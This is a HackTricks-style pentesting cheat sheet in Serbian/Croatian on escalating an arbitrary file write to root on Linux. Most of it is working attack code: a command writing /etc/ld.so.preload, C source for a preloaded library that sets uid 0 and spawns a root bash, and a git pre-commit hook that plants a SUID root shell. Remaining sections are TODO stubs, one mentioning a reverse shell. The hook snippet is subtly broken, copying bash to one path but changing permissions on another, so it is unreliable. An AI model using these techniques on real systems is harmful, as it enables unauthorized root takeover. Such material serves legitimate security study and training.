# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ova datoteka se ponaša kao **`LD_PRELOAD`** env varijabla, ali takođe funkcioniše u **SUID binarnim datotekama**.\
Ako možete da je kreirate ili modifikujete, jednostavno možete dodati **putanju do biblioteke koja će biti učitana** sa svakom izvršenom binarnom datotekom.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **izvršavaju** na raznim **događajima** u git repozitorijumu, kao što su kada se kreira commit, merge... Dakle, ako **privilegovana skripta ili korisnik** često obavljaju ove radnje i moguće je **pisati u `.git` folder**, to se može iskoristiti za **privesc**.

Na primer, moguće je **generisati skriptu** u git repozitorijumu u **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Datoteka koja se nalazi u `/proc/sys/fs/binfmt_misc` označava koji binarni fajl treba da izvrši koji tip fajlova. TODO: proveriti zahteve za zloupotrebu ovoga da se izvrši rev shell kada je otvoren uobičajen tip fajla.

{{#include ../../banners/hacktricks-training.md}}
